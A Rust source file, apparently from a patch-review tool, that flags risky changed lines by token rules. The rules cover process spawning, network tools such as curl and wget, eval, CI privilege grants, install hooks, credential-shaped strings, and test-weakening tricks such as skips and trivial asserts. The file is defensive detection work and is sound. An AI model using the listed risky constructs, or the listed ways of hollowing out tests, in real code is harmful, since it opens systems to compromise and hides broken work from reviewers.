// DDF integration: code-evidence risk signals with hunk addresses (plan 2026-10-30, Feature A).
// Design/status: docs/PLAN_AGENT_EVIDENCE_AND_OBSERVABILITY.md#feature-a-code-evidence-risk-signals
// Module vault note (bidirectional): obsidian://open?vault=deep-diff-forge.vault&file=Implementation%2FModules%2Fcrates--deep-diff-forge-graph--src--evidence
//! Code evidence: what the changed lines of a patch do, found in the patch alone and pointed at
//! by hunk address and line, so an agent can check each claim instead of trusting it.
//!
//! The rules that read one line live in one table, `RULES`: one signal, the side of the change it
//! reads, the view it reads (code with comments and strings blanked, or the raw line), where it
//! applies, and what it matches. The integrity signals of a Rust hunk (a panic path, a trivial
//! assertion, a stub, a skipped or a removed test) are read from the tokens of each side of the
//! hunk, across its lines (the module `rust_tokens`). Evidence is lexical ([`EVIDENCE_BASIS`]): it
//! finds tokens, it never proves a change is safe, and a construct built at run time, or one
//! the hunk shows only a part of, can hide from it.

use crate::lexical::{Language, ScanState, code_view, has_token, is_boundary_blocker, is_ident};
use crate::rust_tokens;
use deep_diff_forge_core::{HunkId, PatchHunk, PatchLineKind, ReviewFile};

/// The basis of the first rung: what every item carried before [`Basis`] existed, and what an
/// item found by a token on one line still carries.
pub const EVIDENCE_BASIS: &str = Basis::Lexical.label();

/// The most evidence items a file reports; the score still counts every signal found.
pub const MAX_EVIDENCE_PER_FILE: usize = 32;

/// What a changed line does that a reviewer should see first.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum EvidenceSignal {
    /// Rust `unsafe` added.
    UnsafeAdded,
    /// A process is started (`Command::new`, `subprocess`, `child_process`, `exec.Command`).
    ProcessSpawn,
    /// A network call or download (`reqwest`, `requests`, `fetch(`, `curl`, `wget`).
    NetworkFetch,
    /// Code built and run from data (`eval(`, `exec(`, `new Function(`, shell `eval`).
    DynamicEval,
    /// A CI workflow gains a privilege (`pull_request_target`, write permissions, inherited
    /// secrets).
    CiPrivilege,
    /// Code that runs at build or install time (`build.rs`, `setup.py`, npm install hooks).
    BuildHook,
    /// Text shaped like a credential (a private key header, a cloud or forge token).
    SecretLike,
    /// A lint, type or coverage check is switched off (`#[allow(`, `# noqa`, `@ts-ignore`).
    CheckSuppressed,
    /// A test is removed.
    TestRemoved,
    /// A test is switched off where it stands (`#[ignore]`, `pytest.mark.skip`, `it.skip(`,
    /// `t.Skip(`): it still reads as a test and checks nothing.
    TestSkipped,
    /// An assertion that cannot fail (`assert!(true)`, `assert True`, `expect(true).toBe(true)`).
    TrivialAssert,
    /// A placeholder where code should be (`todo!(`, `unimplemented!(`,
    /// `raise NotImplementedError`).
    StubAdded,
    /// An error is caught and dropped: an `except` whose body is `pass`, an empty `catch` block,
    /// an empty `if err != nil` block, `_ = err`, an `Err(_)` arm that does nothing.
    ErrorSwallowed,
    /// A call that panics on failure is added (Rust `unwrap` and `expect`, called as a method
    /// or by a path, or the standard one passed as a function). It is reported in test code
    /// too: nothing in a patch proves that code is test code, and an item the hunk shows under
    /// a test attribute says so ([`Evidence::test_likely`]).
    PanicPathAdded,
}

impl EvidenceSignal {
    /// Every signal, in the order scores and output list them.
    pub const ALL: [Self; 14] = [
        Self::UnsafeAdded,
        Self::ProcessSpawn,
        Self::NetworkFetch,
        Self::DynamicEval,
        Self::CiPrivilege,
        Self::BuildHook,
        Self::SecretLike,
        Self::CheckSuppressed,
        Self::TestRemoved,
        Self::TestSkipped,
        Self::TrivialAssert,
        Self::StubAdded,
        Self::ErrorSwallowed,
        Self::PanicPathAdded,
    ];

    /// Stable snake-case label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::UnsafeAdded => "unsafe_added",
            Self::ProcessSpawn => "process_spawn",
            Self::NetworkFetch => "network_fetch",
            Self::DynamicEval => "dynamic_eval",
            Self::CiPrivilege => "ci_privilege",
            Self::BuildHook => "build_hook",
            Self::SecretLike => "secret_like",
            Self::CheckSuppressed => "check_suppressed",
            Self::TestRemoved => "test_removed",
            Self::TestSkipped => "test_skipped",
            Self::TrivialAssert => "trivial_assert",
            Self::StubAdded => "stub_added",
            Self::ErrorSwallowed => "error_swallowed",
            Self::PanicPathAdded => "panic_path_added",
        }
    }

    /// The score a file gains once for carrying this signal (the one weight table).
    #[must_use]
    pub const fn weight(self) -> u32 {
        match self {
            Self::SecretLike => 5,
            Self::UnsafeAdded | Self::ProcessSpawn | Self::DynamicEval | Self::CiPrivilege => 4,
            Self::NetworkFetch
            | Self::BuildHook
            | Self::TestRemoved
            | Self::TestSkipped
            | Self::TrivialAssert
            | Self::StubAdded
            | Self::ErrorSwallowed
            | Self::PanicPathAdded => 3,
            Self::CheckSuppressed => 2,
        }
    }

    /// Whether the signal is about a test losing its force. Such a signal lives in test files, so
    /// a test path does not halve its weight as it does every other signal's.
    #[must_use]
    pub const fn weakens_a_test(self) -> bool {
        matches!(
            self,
            Self::TestRemoved | Self::TestSkipped | Self::TrivialAssert
        )
    }
}

/// Which side of the change a line is on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Side {
    /// An added line, numbered on the new side.
    New,
    /// A removed line, numbered on the old side.
    Old,
}

impl Side {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::New => "new",
            Self::Old => "old",
        }
    }
}

/// How an evidence item was found: the rung of the evidence ladder that confirmed it. A higher
/// rung sees more than a lower one, and an item states the highest that found it.
///
/// There was a third value, `syntax_fragment`, for an item a parser confirmed, until
/// 2026-11-14: the parser is out of the evidence path (the module `rust_tokens` says why).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Basis {
    /// One changed line, comments and strings blanked, matched by token.
    Lexical,
    /// Tokens read across the lines of one side of the hunk: a changed line with its
    /// neighbours.
    Hunk,
}

impl Basis {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Lexical => "lexical",
            Self::Hunk => "hunk",
        }
    }
}

/// One piece of evidence: a signal at a line of a hunk.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Evidence {
    pub signal: EvidenceSignal,
    /// The rung that found it ([`Basis`]).
    pub basis: Basis,
    /// The hunk, by id (for anchors) and by address (for machines).
    pub hunk: HunkId,
    pub address: String,
    pub side: Side,
    /// The line number on `side`.
    pub line: u32,
    /// The hunk shows this panic path inside the braces of an item whose attribute spells a
    /// test (`#[test]`, a path ending in `::test`, `#[rstest]`, `#[cfg(test)]`). It is a hint
    /// for a reader and never proof: an import can bind those names to anything, a hunk can
    /// sit under an open comment, and the braces are only counted. So the item stands, the
    /// score does not change, and what a judge sees is the same; a reader may weigh the item
    /// by it. Only ever true on [`EvidenceSignal::PanicPathAdded`].
    ///
    /// Nothing withdraws a panic path. Until 2026-11-14 a parser withdrew one that it "proved"
    /// to be inside a top-level `#[cfg(test)]` item of a file the patch creates whole. Five
    /// rounds of review each found another text that the grammar and the compiler read
    /// differently, every one compiled and run to a panic in production code (second
    /// independent review, IR2-H-1 to IR2-H-4), and that class has no end. The cost is that a
    /// panic path in a test module is reported, with this mark.
    pub test_likely: bool,
}

/// What part of a line a rule reads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum View {
    /// Comments and string contents blanked.
    Code,
    /// The line as written (a suppression lives in a comment, a secret in a string).
    Raw,
}

/// Where a rule applies.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// Files of these languages.
    Languages(&'static [Language]),
    /// Any file, any language or none.
    Any,
    /// CI workflow definitions (`.github/workflows/*.yml`, `.gitlab-ci.yml`).
    CiWorkflow,
    /// Build and install scripts (`build.rs`, `setup.py`).
    BuildScript,
    /// `package.json`.
    PackageJson,
}

/// What a rule looks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Match {
    /// Any of these tokens. A trailing `*` makes a token a prefix (no boundary after it).
    Tokens(&'static [&'static str]),
    /// Any line with code on it.
    AnyCode,
    /// A credential-shaped string ([`looks_like_secret`]).
    Secret,
    /// A JS import of one of these modules ([`imports_module`]).
    Imports(&'static [&'static str]),
    /// An error handler with nothing in it ([`empty_handler`]). It reads the line and the next
    /// line on the same side of the hunk, so what it finds has [`Basis::Hunk`].
    EmptyHandler,
    /// One of `heads` (a whole word, with no [`is_boundary_blocker`] before it) followed by one
    /// of `tails`, with any whitespace before the tail and between its bytes: `# [allow(` is
    /// `#` and `[allow(`.
    Spaced {
        heads: &'static [&'static str],
        tails: &'static [&'static str],
    },
}

impl Match {
    /// The rung a match of this kind stands on.
    const fn basis(self) -> Basis {
        match self {
            Self::EmptyHandler => Basis::Hunk,
            Self::Tokens(_)
            | Self::AnyCode
            | Self::Secret
            | Self::Imports(_)
            | Self::Spaced { .. } => Basis::Lexical,
        }
    }
}

#[derive(Debug, Clone, Copy)]
struct Rule {
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
}

const RUST: &[Language] = &[Language::Rust];
const PYTHON: &[Language] = &[Language::Python];
const JS: &[Language] = &[Language::JavaScript];
const GO: &[Language] = &[Language::Go];
const SHELL: &[Language] = &[Language::Shell];
const SHELL_OR_YAML: &[Language] = &[Language::Shell, Language::Yaml];

const fn rule(
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
) -> Rule {
    Rule {
        signal,
        side,
        view,
        scope,
        matches,
    }
}

use EvidenceSignal as S;

/// Every evidence rule that reads one line. A test builds one positive case per token from this
/// table, so a token cannot be added without a case that finds it. The Rust rules for a removed
/// or skipped test, a trivial assertion, a stub and a panic path are not here: they read the
/// tokens of a hunk across its lines (the module `rust_tokens`).
const RULES: &[Rule] = &[
    rule(
        S::UnsafeAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["unsafe"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Command::new", "process::Command"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "subprocess.",
            "os.system(",
            "os.popen(",
            "os.exec*",
            "os.spawn*",
            "pty.spawn(",
        ]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
    ),
    // The module is always named in a string, which the code view blanks, so the specifier is
    // read from the raw line wherever the code view shows an import.
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Imports(&["child_process"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["exec.Command(", "exec.CommandContext(", "syscall.Exec("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "reqwest::",
            "ureq::",
            "TcpStream::connect",
            "UdpSocket::bind",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "requests.",
            "urllib.request",
            "http.client",
            "socket.socket(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "fetch(",
            "XMLHttpRequest",
            "http.request(",
            "https.request(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["http.Get(", "http.Post(", "http.NewRequest(", "net.Dial("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(SHELL_OR_YAML),
        Match::Tokens(&["curl", "wget"]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["eval(", "exec(", "compile(", "__import__("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["eval(", "new Function("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(SHELL),
        Match::Tokens(&["eval"]),
    ),
    rule(
        S::CiPrivilege,
        Side::New,
        View::Code,
        Scope::CiWorkflow,
        Match::Tokens(&[
            "pull_request_target",
            "write-all",
            "contents: write",
            "id-token: write",
            "packages: write",
            "actions: write",
            "secrets: inherit",
        ]),
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Code,
        Scope::BuildScript,
        Match::AnyCode,
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Raw,
        Scope::PackageJson,
        Match::Tokens(&[
            "\"preinstall\"",
            "\"install\"",
            "\"postinstall\"",
            "\"prepare\"",
        ]),
    ),
    rule(
        S::SecretLike,
        Side::New,
        View::Raw,
        Scope::Any,
        Match::Secret,
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(RUST),
        // whatever the spacing: `# [allow(` and `#! [allow(` are the same attributes
        Match::Spaced {
            heads: &["#"],
            tails: &["[allow(", "![allow("],
        },
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "# noqa",
            "#noqa",
            "# type: ignore",
            "# nosec",
            "# pragma: no cover",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(JS),
        Match::Tokens(&[
            "eslint-disable",
            "@ts-ignore",
            "@ts-nocheck",
            "@ts-expect-error",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(GO),
        Match::Tokens(&["//nolint", "// nolint", "#nosec"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["def test*", "async def test*"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["it(", "test(", "describe("]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["func Test*"]),
    ),
    // A decorator is code, so a skip named in a comment or a string is not one.
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "pytest.mark.skip*",
            "pytest.mark.xfail",
            "pytest.skip(",
            "unittest.skip*",
            "self.skipTest(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "it.skip(",
            "test.skip(",
            "describe.skip(",
            "it.skipIf(",
            "test.skipIf(",
            "describe.skipIf(",
            "it.todo(",
            "test.todo(",
            "xit(",
            "xtest(",
            "xdescribe(",
        ]),
    ),
    rule(
        S::TestSkipped,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["t.Skip(", "t.Skipf(", "t.SkipNow("]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["assert True", "self.assertTrue(True)"]),
    ),
    rule(
        S::TrivialAssert,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "expect(true).toBe(true)",
            "expect(true).toEqual(true)",
            "assert(true)",
            "assert.ok(true)",
        ]),
    ),
    // A placeholder named in a message string is blanked with the string, so only the forms
    // that are code are read: JS and Go have none.
    rule(
        S::StubAdded,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["raise NotImplementedError"]),
    ),
    // An arm that names no error and does nothing is on one line: a token finds it.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Err(_) => {}", "Err(_) => ()"]),
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["_ = err"]),
    ),
    // A handler and its empty body are often two lines: these read the next line too.
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::EmptyHandler,
    ),
    rule(
        S::ErrorSwallowed,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::EmptyHandler,
    ),
];

/// What a file is, for rule scopes.
struct FileKind {
    language: Option<Language>,
    ci_workflow: bool,
    build_script: bool,
    package_json: bool,
}

impl FileKind {
    fn of(file: &ReviewFile) -> Self {
        let path = file.path.as_str();
        let name = path.rsplit('/').next().unwrap_or(path);
        // A shebang is read from the first line of a new side that starts at line 1.
        let first_line = file
            .patch_twin
            .hunks
            .first()
            .filter(|h| h.new_start == Some(1))
            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
            .map(|l| l.text.as_str());
        // One extension table: the lexical layer's.
        let yaml = Language::of(path, None) == Some(Language::Yaml);
        let generated = crate::risk::is_generated_or_vendored(path);
        Self {
            language: Language::of(path, first_line),
            ci_workflow: ((path.starts_with(".github/workflows/")
                || path.contains("/.github/workflows/"))
                && yaml)
                || name == ".gitlab-ci.yml",
            // These two are path-scoped (the file's role, not its tokens), so like every path
            // signal they do not apply under a generated or vendored path. Token rules do.
            build_script: (name == "build.rs" || name == "setup.py") && !generated,
            package_json: name == "package.json" && !generated,
        }
    }

    fn admits(&self, scope: Scope) -> bool {
        match scope {
            Scope::Any => true,
            Scope::Languages(languages) => self.language.is_some_and(|l| languages.contains(&l)),
            Scope::CiWorkflow => self.ci_workflow,
            Scope::BuildScript => self.build_script,
            Scope::PackageJson => self.package_json,
        }
    }
}

/// Every piece of evidence in `file`, in hunk order, then line order, then rule order, with no
/// duplicates and no cap (callers cap what they print with [`MAX_EVIDENCE_PER_FILE`]).
///
/// The answer for a hunk comes from that hunk alone: there is no budget shared by the hunks of
/// a file or the files of a review, so it does not depend on what else the review holds or on
/// the order it is read in. (While a parser read the hunks, a review had a plan that said
/// which hunks it might read, and every caller had to pass it.)
#[must_use]
pub fn file_evidence(file: &ReviewFile) -> Vec<Evidence> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let mut out: Vec<Evidence> = Vec::new();
    for hunk in &file.patch_twin.hunks {
        let mut address = None;
        // `hunk_matches` yields each (side, signal, line) once and items from different hunks
        // differ in `hunk`, so there is nothing to deduplicate: a scan of `out` per item made a
        // patch of 160k matching lines take 4.8 s.
        let found = hunk_matches(hunk, kind.language, &rules);
        for (side, signal, line, basis) in found.items {
            let address = address
                .get_or_insert_with(|| hunk.address(&file.path))
                .clone();
            out.push(Evidence {
                signal,
                basis,
                hunk: hunk.id,
                address,
                side,
                line,
                test_likely: signal == S::PanicPathAdded
                    && side == Side::New
                    && found.test_likely.binary_search(&line).is_ok(),
            });
        }
    }
    out
}

/// The distinct signals in one hunk of `file`, in [`EvidenceSignal::ALL`] order: the labels the
/// outline and hunk views show. The same scan as [`file_evidence`], of this hunk alone, so a
/// view never disagrees with the rank and a view of one hunk costs that hunk.
#[must_use]
pub fn hunk_signals(file: &ReviewFile, hunk: &PatchHunk) -> Vec<EvidenceSignal> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let found = hunk_matches(hunk, kind.language, &rules).items;
    EvidenceSignal::ALL
        .into_iter()
        .filter(|signal| found.iter().any(|(_, s, _, _)| s == signal))
        .collect()
}

/// The code view of each line of `hunk` on the old and on the new side: comments and strings
/// blank, in the state the scanner reached on that side. In Rust a raw identifier reads as the
/// identifier it is ([`without_raw_prefixes`]).
fn hunk_views(
    hunk: &PatchHunk,
    language: Option<Language>,
) -> Vec<(Option<String>, Option<String>)> {
    let mut old_state = ScanState::default();
    let mut new_state = ScanState::default();
    hunk.lines
        .iter()
        .map(|line| {
            let view = |state: &mut ScanState| {
                language.map(|l| {
                    let code = code_view(l, &line.text, state);
                    if l == Language::Rust {
                        without_raw_prefixes(&code).unwrap_or(code)
                    } else {
                        code
                    }
                })
            };
            match line.kind {
                PatchLineKind::Context => (view(&mut old_state), view(&mut new_state)),
                PatchLineKind::Added => (None, view(&mut new_state)),
                PatchLineKind::Removed => (view(&mut old_state), None),
            }
        })
        .collect()
}

/// What [`hunk_matches`] finds in one hunk.
struct HunkFound {
    /// `(side, signal, line, basis)`, in hunk order and then the order of
    /// [`EvidenceSignal::ALL`].
    items: Vec<(Side, EvidenceSignal, u32, Basis)>,
    /// New-side line numbers, ascending, of the panic paths that stand inside an item whose
    /// attribute spells a test.
    test_likely: Vec<u32>,
}

/// `(side, signal, line, basis)` for every signal found on a changed line of `hunk`: once per
/// signal and line however many rules or tokens match, in [`EvidenceSignal::ALL`] order, with the
/// highest [`Basis`] among what matched. Block comments and triple strings are followed through
/// the hunk on each side (state starts fresh per hunk). In a Rust hunk the integrity signals
/// come from the tokens of each side ([`rust_tokens::read_hunk`]), merged in line by line: the
/// reader gives them in hunk order, so nothing is sorted or searched here (a hunk can hold a
/// million of them).
fn hunk_matches(hunk: &PatchHunk, language: Option<Language>, rules: &[&Rule]) -> HunkFound {
    // First the code view of every line on each side it belongs to, so a rule that reads a
    // neighbour sees it as code, in the state the scanner reached there.
    let views = hunk_views(hunk, language);
    // The code of the next line on `side` after line `at`: the line that follows it in that
    // version of the file, when the hunk holds it.
    let next_on = |side: Side, at: usize| -> Option<&str> {
        let other = match side {
            Side::New => PatchLineKind::Removed,
            Side::Old => PatchLineKind::Added,
        };
        let next = at + 1 + hunk.lines[at + 1..].iter().position(|l| l.kind != other)?;
        let view = match side {
            Side::New => views[next].1.as_deref(),
            Side::Old => views[next].0.as_deref(),
        };
        Some(view.unwrap_or(hunk.lines[next].text.as_str()))
    };
    let tokens = if language == Some(Language::Rust) {
        rust_tokens::read_hunk(hunk, &views)
    } else {
        rust_tokens::HunkItems::default()
    };
    // How far into each side's token items the lines have come.
    let (mut new_read, mut old_read) = (0usize, 0usize);
    let mut found: Vec<(Side, EvidenceSignal, u32, Basis)> = Vec::new();
    for (at, line) in hunk.lines.iter().enumerate() {
        let (side, number, view, read, read_to) = match line.kind {
            PatchLineKind::Context => continue,
            PatchLineKind::Added => (
                Side::New,
                line.new_line,
                views[at].1.as_deref(),
                &tokens.new,
                &mut new_read,
            ),
            PatchLineKind::Removed => (
                Side::Old,
                line.old_line,
                views[at].0.as_deref(),
                &tokens.old,
                &mut old_read,
            ),
        };
        let Some(number) = number else { continue };
        let raw = if language == Some(Language::Rust) {
            without_raw_prefixes(&line.text)
        } else {
            None
        };
        let raw = raw.as_deref().unwrap_or(line.text.as_str());
        let hits = |rule: &Rule| {
            let text = match rule.view {
                View::Raw => raw,
                // A rule that reads code needs a language; `Scope::Any` code rules have none.
                View::Code => view.unwrap_or(line.text.as_str()),
            };
            match rule.matches {
                Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
                Match::AnyCode => !text.trim().is_empty(),
                Match::Secret => looks_like_secret(text),
                Match::Imports(modules) => imports_module(text, &line.text, modules),
                Match::EmptyHandler => {
                    language.is_some_and(|l| empty_handler(l, text, next_on(side, at)))
                }
                Match::Spaced { heads, tails } => spaced(text, heads, tails),
            }
        };
        for signal in EvidenceSignal::ALL {
            let mut basis = rules
                .iter()
                .filter(|r| r.signal == signal && r.side == side && hits(r))
                .map(|r| r.matches.basis())
                .max();
            // The reader's items are in the order this loop goes in: by line, then by signal.
            while read
                .get(*read_to)
                .is_some_and(|item| (item.line, item.signal) < (at, signal))
            {
                *read_to += 1;
            }
            if let Some(item) = read.get(*read_to)
                && (item.line, item.signal) == (at, signal)
            {
                basis = basis.max(Some(item.basis));
            }
            if let Some(basis) = basis {
                found.push((side, signal, number, basis));
            }
        }
    }
    HunkFound {
        test_likely: tokens
            .new
            .iter()
            .filter(|item| item.test_likely)
            .filter_map(|item| hunk.lines[item.line].new_line)
            .collect(),
        items: found,
    }
}

/// `text` with the prefix of each raw identifier blanked (`x.r#unwrap()` reads `x.  unwrap()`),
/// or `None` when it holds none. To the compiler `r#unwrap` is the identifier `unwrap`, so a
/// rule that reads a name has to read it the same way; the rules pass over whitespace, and the
/// columns stay where they were (review V3 round 8, VD3R8-M-1: `x.r#unwrap()` and
/// `X::r#unwrap(x)` left no item). The opener of a raw string (`r#"`) is not an identifier and
/// is left alone.
fn without_raw_prefixes(text: &str) -> Option<String> {
    let bytes = text.as_bytes();
    let in_name = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || !b.is_ascii();
    let mut out: Option<Vec<u8>> = None;
    for (at, _) in text.match_indices("r#") {
        let starts = at == 0 || !in_name(bytes[at - 1]);
        let names = bytes
            .get(at + 2)
            .is_some_and(|b| b.is_ascii_alphabetic() || *b == b'_' || !b.is_ascii());
        if starts && names {
            let out = out.get_or_insert_with(|| bytes.to_vec());
            out[at] = b' ';
            out[at + 1] = b' ';
        }
    }
    // Only two ASCII bytes were replaced by two ASCII bytes: still UTF-8.
    out.and_then(|bytes| String::from_utf8(bytes).ok())
}

/// Whether `text` holds one of `heads`, whole and with no [`is_boundary_blocker`] byte before
/// it, followed by one of `tails` ([`follows`]): `# [allow(` holds `#` and `[allow(`.
fn spaced(text: &str, heads: &[&str], tails: &[&str]) -> bool {
    let bytes = text.as_bytes();
    heads.iter().any(|head| {
        text.match_indices(head).any(|(start, _)| {
            (start == 0 || !is_boundary_blocker(bytes[start - 1]))
                && tails
                    .iter()
                    .any(|tail| follows(&bytes[start + head.len()..], tail.as_bytes()).is_some())
        })
    })
}

/// Where `tail` ends in `rest`, when `rest` begins with it and the whitespace before each of
/// the tail's bytes is passed over.
fn follows(rest: &[u8], tail: &[u8]) -> Option<usize> {
    let mut at = 0;
    for expected in tail {
        while rest.get(at).is_some_and(u8::is_ascii_whitespace) {
            at += 1;
        }
        if rest.get(at) != Some(expected) {
            return None;
        }
        at += 1;
    }
    Some(at)
}

/// Whether `code` (a line's code view) opens an error handler that does nothing, given the code
/// of the line after it on the same side (`None` when the hunk ends there).
///
/// - Python: `except …:` whose body is `pass` or `...`, on the same line or the next.
/// - JS and TS: `catch`, with or without a binding, whose block is empty: `{}` on the line, `{`
///   ending the line and `}` starting the next, or the whole empty block on the next line. Also
///   a promise's `.catch(…)` whose handler is a function with an empty body, on one line.
/// - Go: `if err != nil {`, with or without a statement before the test, closed at once, on the
///   line or the next.
///
/// A handler whose body the hunk does not show is not evidence: the next line must be there.
fn empty_handler(language: Language, code: &str, next: Option<&str>) -> bool {
    let line = code.trim();
    let next = next.map(str::trim);
    let nothing = |body: &str| matches!(body, "pass" | "...");
    // The block after `head` is empty: `{}` here, or `{` here and `}` first on the next line.
    let empty_block = |after: &str| {
        let after = after.trim();
        let closed_here = after
            .strip_prefix('{')
            .is_some_and(|rest| rest.trim_start().starts_with('}'));
        let block_on_next_line = after.is_empty()
            && next.is_some_and(|n| {
                n.strip_prefix('{')
                    .is_some_and(|rest| rest.trim_start().starts_with('}'))
            });
        closed_here
            || (after == "{" && next.is_some_and(|n| n.starts_with('}')))
            || block_on_next_line
    };
    match language {
        Language::Python => {
            let Some(rest) = line.strip_prefix("except") else {
                return false;
            };
            if rest.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                return false;
            }
            let Some((_, body)) = rest.rsplit_once(':') else {
                return false;
            };
            let body = body.trim();
            nothing(body) || (body.is_empty() && next.is_some_and(nothing))
        }
        Language::JavaScript => line.match_indices("catch").any(|(at, word)| {
            // A promise's `.catch(…)` swallows when its handler is a function with an empty body.
            if at > 0 && line.as_bytes()[at - 1] == b'.' {
                return empty_callback(&line[at + word.len()..]);
            }
            let before_ok = at == 0 || !is_boundary_blocker(line.as_bytes()[at - 1]);
            let after = line[at + word.len()..].trim_start();
            if !before_ok || after.as_bytes().first().is_some_and(|b| is_ident(*b)) {
                return false;
            }
            // An optional binding in parentheses, then the block.
            let after = match after.strip_prefix('(') {
                Some(binding) => match binding.split_once(')') {
                    Some((_, block)) => block,
                    None => return false,
                },
                None => after,
            };
            empty_block(after)
        }),
        // `if err != nil {` and `if err := f(); err != nil {`: the test comes last in the head.
        Language::Go => line.strip_prefix("if ").is_some_and(|head| {
            head.rsplit_once("err != nil")
                .is_some_and(|(_, after)| empty_block(after))
        }),
        Language::Rust | Language::Shell | Language::Yaml => false,
    }
}

/// Whether `after` (what follows `.catch` on a line of code) is a call whose argument is a
/// function with an empty body: `(() => {})`, `(e => {})`, `(async (e) => { })`,
/// `(function () {})`. Anything else, including a handler that names a function, is not.
fn empty_callback(after: &str) -> bool {
    let Some(inner) = after.trim_start().strip_prefix('(') else {
        return false;
    };
    let inner = inner.trim_start();
    let inner = inner.strip_prefix("async ").unwrap_or(inner).trim_start();
    let body = if let Some(rest) = inner.strip_prefix("function") {
        // An optional name, then the parameters.
        let rest = rest.trim_start();
        let name = rest.bytes().take_while(|b| is_ident(*b)).count();
        let Some(rest) = rest
            .get(name..)
            .and_then(|rest| after_closing(rest.trim_start(), b'(', b')'))
        else {
            return false;
        };
        rest
    } else {
        let after_parameters = if inner.starts_with('(') {
            after_closing(inner, b'(', b')')
        } else {
            inner.get(inner.bytes().take_while(|b| is_ident(*b)).count()..)
        };
        let Some(rest) = after_parameters.and_then(|rest| rest.trim_start().strip_prefix("=>"))
        else {
            return false;
        };
        rest
    };
    body.trim_start()
        .strip_prefix('{')
        .and_then(|rest| rest.trim_start().strip_prefix('}'))
        .is_some_and(|rest| rest.trim_start().starts_with(')'))
}

/// What follows the `close` that matches the `open` that `text` starts with, nesting counted:
/// for `(a = f(), b) => {}` and parentheses, ` => {}`. `None` when `text` does not start with
